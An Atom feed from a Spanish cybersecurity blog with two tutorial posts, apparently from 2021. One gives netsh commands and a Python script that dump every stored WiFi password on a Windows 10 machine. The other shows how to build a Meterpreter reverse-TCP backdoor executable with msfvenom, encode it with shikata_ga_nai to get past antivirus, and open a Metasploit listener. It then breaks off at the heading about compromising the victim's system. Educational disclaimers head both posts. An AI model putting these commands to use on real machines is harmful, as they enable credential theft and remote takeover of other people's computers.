<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-09-12T22:14:45+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">r4kso | Blog de ciberseguridad</title><subtitle>Blog personal sobre ciberseguridad y otros</subtitle><author><name>r4kso</name></author><entry><title type="html">Como conseguir contraseñas wifi en Windows 10</title><link href="http://localhost:4000/como-conseguir-contrasenas-wifi-en-windows-10/" rel="alternate" type="text/html" title="Como conseguir contraseñas wifi en Windows 10" /><published>2021-09-12T00:00:00+01:00</published><updated>2021-09-12T00:00:00+01:00</updated><id>http://localhost:4000/como-conseguir-contrasenas-wifi-en-windows-10</id><content type="html" xml:base="http://localhost:4000/como-conseguir-contrasenas-wifi-en-windows-10/">&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/como-conseguir-contrasenas-wifi-en-windows-10/portada.jpg&quot; width=&quot;50%&quot; /&gt;
&lt;/p&gt;

&lt;p class=&quot;notice--danger&quot;&gt;&lt;strong&gt;Aviso:&lt;/strong&gt; Este post se ha realizado únicamente con fines educativos. No me hago responsable de las malas acciones que puedan realizar terceras personas, fruto del conocimiento transmitido.&lt;/p&gt;

&lt;p&gt;Teniendo acceso a un dispositivo con Windows 10, es bastante sencillo obtener las contraseñas WiFi almacenadas en sus previas conexiones. Para conseguirlas, nos basaremos en el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netsh&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;obteniendo-contraseñas-wifi-desde-la-consola&quot;&gt;Obteniendo contraseñas WiFi desde la consola&lt;/h2&gt;
&lt;p&gt;Para empezar, vamos a listar las ID de las conexiones WiFi a las que el dispositivo ha accedido anteriormente y que siguen “almacenadas” dentro de él. Para ello, usaremos el siguiente comando dentro de la consola:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netsh wlan show profiles
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ahora veremos listadas las conexiones wifi a las que hemos accedido. En mi caso son las siguientes:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/como-conseguir-contrasenas-wifi-en-windows-10/comando-1.jpg&quot; width=&quot;50%&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Ahora trataremos de obtener algo más de información sobre alguna de ellas. en este caso utilizaré la red WiFi a la que me encuentro conectado. Para ello utilizaremos el comando anterior añadiendo el ID de la red WiFi sobre la que queremos obtener información:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netsh wlan show profile MOVISTAR_PLUS_5905
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/como-conseguir-contrasenas-wifi-en-windows-10/comando-2.jpg&quot; width=&quot;50%&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Ahora podremos ver información general, ajustes de conectividad, de seguridad y de coste. En este punto nos interesa un valor en especial: “Security Key”. Como vemos, nos indica que está presente, eso quiere decir que disponemos de la clave de seguridad.
Queremos obtenerla ¿no? Para ello, le añadiremos al comando anterior &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;key=clear&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netsh wlan show profile MOVISTAR_PLUS_5905 &lt;span class=&quot;nv&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;clear
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/como-conseguir-contrasenas-wifi-en-windows-10/comando-3.jpg&quot; width=&quot;50%&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Así de simple hemos podido obtener la contraseña, y esto mismo funcionará para el resto de IDs. Si buscásemos obtenerlas todas y hubieran 50 IDs diferentes, tardaríamos una eternidad y además sería bastante tedioso, así que… ¿Por qué no automatizarlo?&lt;/p&gt;

&lt;h2 id=&quot;automatizando-la-obtención-de-contraseñas-wifi-mediante-python&quot;&gt;Automatizando la obtención de contraseñas WiFi mediante Python&lt;/h2&gt;
&lt;p&gt;Sin duda alguna Python es de las mejores opciones para hacer scripts de forma rápida y automatizar la mayoría de cosas que se nos hacen tediosas. El objetivo de este post no es enseñar a programar, es por ello que explicaré muy por encima lo que hace el código. Notad que utilizaremos los comandos anteriormente mencionados haciendo uso del módulo “subprocess”:&lt;/p&gt;

&lt;p&gt;Empezaremos con los módulos necesarios.&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;subprocess&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;El módulo “subprocess” nos permitirá usar comandos del sistema y el módulo “re” nos permitirá usar expresiones regulares para extraer información de los resultados obtenidos mediante los comandos de consola.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#...
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netsh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;wlan&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;show&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;profiles&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;capture_output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;names&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;All User Profile     : (.*)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;En estas líneas de código hemos creado una variable (output) que almacena el resultado del comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netsh wlan show profiles&lt;/code&gt; y otra variable en la que almacenamos todas las IDs de obtenidas en “output”. Luego de esto creamos una lista para almacenar posteriormente la información.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#...
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;names&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;names&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;wifi_profile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pinfo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netsh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;wlan&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;show&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;profile&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;capture_output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Security key           : Absent&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;wifi_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ssid&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;pinfo_pswd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netsh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;wlan&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;show&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;profile&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;key=clear&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;capture_output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;pswd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Key Content            : (.*)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pinfo_pswd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pswd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;wifi_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;wifi_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pswd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
            &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wifi_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Mediante estas lineas de código comprobamos que existe al menos 1 ID almacenada. Si es así, mediante un bucle buscamos aquellas que tienen almacenada la contraseña (“Security Key : Present”) y la conseguimos añadiéndola posteriormente a una lista. Las IDs que no tienen la contraseña guardada las descartamos. Ahora solo nos queda mostrarlas en pantalla&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Recorremos la lista y la mostramos en pantalla. Así hemos automatizado la obtención de todas las contraseñas (que en mi caso son únicamente 3). Vamos a ejecutarlo y comprobar que funciona:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/como-conseguir-contrasenas-wifi-en-windows-10/script.jpg&quot; width=&quot;50%&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Espero que te haya sido útil este post, recuerda utilizar esta información de forma adecuada. Puedes seguirme en mis redes sociales: &lt;a href=&quot;https://www.instagram.com/notaboutfran/&quot;&gt;Instagram&lt;/a&gt; y &lt;a href=&quot;https://twitter.com/notaboutfran&quot;&gt;Twitter&lt;/a&gt;.&lt;/p&gt;</content><author><name>r4kso</name></author><category term="Tutoriales" /><category term="Tutoriales" /><category term="Passwords" /><category term="Python" /><category term="Windows 10" /><summary type="html">En este post te voy a explicar cómo conseguir las contraseñas wifi almacenadas en un dispositivo que utiliza como sistema operativo Windows 10, y cómo utilizar Python para automatizarlo</summary></entry><entry><title type="html">Cómo crear un backdoor y su funcionamiento</title><link href="http://localhost:4000/crear-backdoors/" rel="alternate" type="text/html" title="Cómo crear un backdoor y su funcionamiento" /><published>2021-05-30T00:00:00+01:00</published><updated>2021-05-30T00:00:00+01:00</updated><id>http://localhost:4000/crear-backdoors</id><content type="html" xml:base="http://localhost:4000/crear-backdoors/">&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/crear-backdoor-como-funciona/portada.jpg&quot; width=&quot;80%&quot; /&gt;
&lt;/p&gt;

&lt;p class=&quot;notice--danger&quot;&gt;&lt;strong&gt;Aviso:&lt;/strong&gt; Este post se ha realizado únicamente con fines educativos. No me hago responsable de las acciones que puedan realizar terceras personas, fruto del conocimiento transmitido.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Backdoor&lt;/strong&gt;: Un backdoor (puerta trasera), es una secuencia dentro del código de programación de algún archivo o programa que permite otorgar el control del dispositivo utilizado al atacante. Cuando esta puerta trasera es escondida sobre un archivo o programa aparentemente legítimo, decimos que se trata de un troyano.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Actualmente crear un backdoor es bastante sencillo, pues existen diferentes herramientas que nos facilitan la tarea. La complejidad real viene a al momento de esconderlo y evitar que la víctima se de cuenta.&lt;/p&gt;

&lt;p&gt;Veremos cómo crear ese backdoor mediante el uso de “msfvenom”, cómo evadir algunos antivirus y qué se puede hacer una vez se haya comprometido el sistema de la víctima (podremos ver su webcam en tiempo real, sus archivos…).&lt;/p&gt;

&lt;p&gt;NOTA: Todas las pruebas se han realizado en entornos controlados.&lt;/p&gt;

&lt;h2 id=&quot;creación-del-backdoor&quot;&gt;Creación del backdoor&lt;/h2&gt;
&lt;p&gt;Para empezar con la creación del backdoor, abriremos una consola linux y buscaremos las diferentes opciones de &lt;strong&gt;msfvenom&lt;/strong&gt; para ver qué nos permite hacer mediante el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom -h&lt;/code&gt;&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/crear-backdoor-como-funciona/msfvenom.png&quot; width=&quot;100%&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Como vemos, nos ofrece diferentes parámetros y opciones. A nosotros nos interesan los siguientes:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;“-p”: Mediante este parámetro seleccionaremos la carga útil (el código malicioso) -&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;windows/meterpreter/reverse_tcp&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;“lhost”: Indicaremos nuestra IP, donde el programa establecerá conexión y así poder recibir y enviar información -&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;tu IP&amp;gt;&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;“lport”: Indicaremos el puerto que queramos utilizar al momento de entablar la conexión -&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;el puerto que tú quieras&amp;gt;&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;“-f”: Mediante este parámetro seleccionaremos el formato del programa malicioso -&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exe&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;“-o”: Mediante este parámetro indicaremos la ruta de salida del programa creado -&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;la ruta que tú decidas&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;El comando final quedaría de la siguiente forma:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/meterpreter/reverse_tcp &lt;span class=&quot;nv&quot;&gt;lhost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.1.&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;lport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4444 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; exe &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /home/r4kso/Desktop/backdoor.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Como vemos, se nos ha creado el programa malicioso :&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/crear-backdoor-como-funciona/creacion-programa.png&quot; width=&quot;100%&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Ahora, solo bastaría con hacer que el objetivo inicie el programa, pero nos encontramos con un problema… Y es que es muy sencillo de detectar por los antivirus, como demuestra la siguiente prueba:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/crear-backdoor-como-funciona/prueba-virustotal.png&quot; width=&quot;50%&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Casi todos los antivirus lo han detectado así que… ¿Qué podemos hacer? Pues bien, a parte de utilizar otros formatos y sistemas como las &lt;strong&gt;macros de Suite de Office&lt;/strong&gt; para esconder nuestras backdoors, podemos usar algo llamado &lt;strong&gt;encoders&lt;/strong&gt;. Tal y como su nombre indica, los &lt;em&gt;enconders&lt;/em&gt; codifican el programa, haciéndolo más difícil de leer para los antivirus. No siempre funciona y es por ello que se requieren diferentes métodos. A continuación veremos cómo funciona un encoder.&lt;/p&gt;

&lt;h2 id=&quot;usando-encoders&quot;&gt;Usando encoders&lt;/h2&gt;
&lt;p&gt;msfvenom ofrece la posibilidad de usar un encoder en el momento de crear el programa malicioso. Existen diferentes encoders, uno de los más comúnes es “shikata_ga_nai”. Para utilizarlo, debemos volver a crear el programa, esta vez con dos parámetros extras:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;“-e”: Indica el encoder a utilizar -&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x86/shikata_ga_nai&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;“-i”: El numero de iteraciones -&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;El número de iteraciones a utilizar indica la cantidad de veces que se codificará el programa, haciendo el programa cada vez menos legible con cada iteración. Se recomienda no iterar más de 5 veces, pues el antivirus lo puede detectar directamente como &lt;em&gt;malware&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Bien, pues el comando final quedaría de la siguiente forma:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/meterpreter/reverse_tcp &lt;span class=&quot;nv&quot;&gt;lhost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.1.&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;lport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4444 &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; x86/shikata_ga_nai &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 5 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; exe &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /home/r4kso/Desktop/backdoor.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/crear-backdoor-como-funciona/creacion-programa-codificado.png&quot; width=&quot;100%&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Como se puede ver en consola, el programa se ha creado correctamente y esta vez codificado para tratar de &lt;em&gt;bypassear&lt;/em&gt; al antivirus.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Nota: Esto NO será suficiente para engañar al antivirus, se necesitan otros métodos para conseguirlo.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Ahora iniciaremos la &lt;strong&gt;escucha&lt;/strong&gt; en el puerto que hayamos escogido para nuestro programa malicioso, sirviéndonos de Metasploit. Para ello, lo iniciaremos mediante el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfconsole&lt;/code&gt;, usaremos la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;multi/handler&lt;/code&gt;. Una vez dentro de esta utilidad indicaremos qué tipo de payload hemos utilizado mediante el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;payload windows/meterpreter/reverse_tcp&lt;/code&gt;. Después, indicaremos el host (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LHOST&lt;/code&gt;) y el puerto (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LPORT&lt;/code&gt;).&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/crear-backdoor-como-funciona/msfconsole.png&quot; width=&quot;50%&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Ahora que estamos a la escucha, una vez se inicie el programa en el equipo correspondiente obtendremos acceso al sistema.&lt;/p&gt;

&lt;h2 id=&quot;comprometiendo-el-sistema&quot;&gt;Comprometiendo el sistema&lt;/h2&gt;
